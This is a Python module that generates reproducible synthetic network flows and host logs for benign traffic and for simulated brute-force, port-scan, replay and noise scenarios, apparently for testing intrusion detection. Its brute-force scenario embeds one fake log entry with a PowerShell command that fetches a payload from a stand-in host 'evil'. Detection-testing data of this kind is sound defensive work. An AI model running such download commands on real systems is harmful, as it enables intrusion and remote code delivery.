"""Synthetic activity generator for benign and malicious scenarios."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from random import Random
from typing import Dict, List, Tuple


class AttackSimulator:
    """Creates reproducible flow and host log streams for experiments."""

    def __init__(self, seed: int = 1337) -> None:
        self.rng = Random(seed)

    def baseline_benign(self, count: int = 50) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        start = datetime.now(timezone.utc)
        flows: List[Dict] = []
        host_logs: List[Dict] = []
        extras: List[Dict] = []

        for i in range(count):
            ts = (start + timedelta(milliseconds=200 * i)).isoformat()
            src = f"10.0.0.{self.rng.randint(2, 20)}"
            dst_port = self.rng.choice([22, 80, 443, 8080])
            flows.append(
                {
                    "timestamp": ts,
                    "src_ip": src,
                    "dst_ip": "127.0.0.1",
                    "src_port": self.rng.randint(1024, 65535),
                    "dst_port": dst_port,
                    "protocol": "tcp",
                    "packet_count": self.rng.randint(4, 20),
                    "byte_count": self.rng.randint(1200, 5000),
                    "duration_ms": self.rng.randint(30, 400),
                    "outcome": "ok",
                }
            )
            host_logs.append(
                {
                    "timestamp": ts,
                    "action": "login_success",
                    "user": self.rng.choice(["alice", "bob", "carol"]),
                    "src_ip": src,
                    "host_ip": "127.0.0.1",
                }
            )

        return flows, host_logs, extras

    def brute_force(self) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        start = datetime.now(timezone.utc)
        attacker = "192.168.56.77"
        flows: List[Dict] = []
        host_logs: List[Dict] = []
        extras: List[Dict] = []

        for i in range(8):
            ts = (start + timedelta(seconds=i * 0.5)).isoformat()
            flows.append(
                {
                    "timestamp": ts,
                    "src_ip": attacker,
                    "dst_ip": "127.0.0.1",
                    "src_port": 40000 + i,
                    "dst_port": 22,
                    "protocol": "tcp",
                    "packet_count": 8,
                    "byte_count": 1024,
                    "duration_ms": 60,
                    "outcome": "auth_fail",
                }
            )
            host_logs.append(
                {
                    "timestamp": ts,
                    "action": "login_failed",
                    "user": "root",
                    "src_ip": attacker,
                    "host_ip": "127.0.0.1",
                }
            )

        host_logs.append(
            {
                "timestamp": (start + timedelta(seconds=6)).isoformat(),
                "action": "process_start",
                "user": "root",
                "src_ip": attacker,
                "host_ip": "127.0.0.1",
                "process": "powershell",
                "command": "Invoke-WebRequest http://evil/payload",
            }
        )
        return flows, host_logs, extras

    def port_scan(self, slow: bool = False) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        start = datetime.now(timezone.utc)
        attacker = "172.16.1.50"
        flows: List[Dict] = []
        gap = 1.4 if slow else 0.1

        for idx, dst_port in enumerate(range(20, 50)):
            ts = (start + timedelta(seconds=idx * gap)).isoformat()
            flows.append(
                {
                    "timestamp": ts,
                    "src_ip": attacker,
                    "dst_ip": "127.0.0.1",
                    "src_port": 35000 + idx,
                    "dst_port": dst_port,
                    "protocol": "tcp",
                    "packet_count": 3,
                    "byte_count": 400,
                    "duration_ms": 15,
                    "outcome": "reject",
                    "scan_hint": True,
                }
            )

        return flows, [], []

    def replay_attack(self) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        start = datetime.now(timezone.utc)
        attacker = "10.10.10.10"
        flow = {
            "src_ip": attacker,
            "dst_ip": "127.0.0.1",
            "src_port": 22222,
            "dst_port": 8080,
            "protocol": "tcp",
            "packet_count": 12,
            "byte_count": 2200,
            "duration_ms": 120,
            "outcome": "ok",
            "replay_hint": True,
        }
        flows = []
        for i in range(6):
            row = dict(flow)
            row["timestamp"] = (start + timedelta(milliseconds=i * 300)).isoformat()
            flows.append(row)
        return flows, [], []

    def noise_injection(self) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        start = datetime.now(timezone.utc)
        flows: List[Dict] = []
        host_logs: List[Dict] = []
        extras: List[Dict] = []

        for i in range(25):
            ts = (start + timedelta(milliseconds=i * 40)).isoformat()
            src_ip = f"100.64.0.{self.rng.randint(2, 200)}"
            is_suspicious = i < 10
            flows.append(
                {
                    "timestamp": ts,
                    "src_ip": src_ip,
                    "dst_ip": "127.0.0.1",
                    "src_port": self.rng.randint(1025, 65530),
                    "dst_port": self.rng.randint(1, 65000),
                    "protocol": "udp",
                    "packet_count": self.rng.randint(1, 4),
                    "byte_count": self.rng.randint(80, 260),
                    "duration_ms": self.rng.randint(1, 15),
                    "outcome": "failed" if is_suspicious else "unknown",
                    "scan_hint": is_suspicious,
                }
            )
            if is_suspicious:
                host_logs.append(
                    {
                        "timestamp": ts,
                        "action": "login_failed",
                        "user": f"user_{i}",
                        "src_ip": src_ip,
                        "host_ip": "127.0.0.1",
                    }
                )
            extras.append(
                {
                    "timestamp": ts,
                    "kind": "noise",
                    "subject": "environment",
                }
            )

        return flows, host_logs, extras

    def sensor_failure(self) -> Tuple[List[Dict], List[Dict], List[Dict]]:
        now = datetime.now(timezone.utc).isoformat()
        return [], [], [{"timestamp": now, "kind": "sensor_status", "sensor": "host-sensor-1", "status": "down"}]
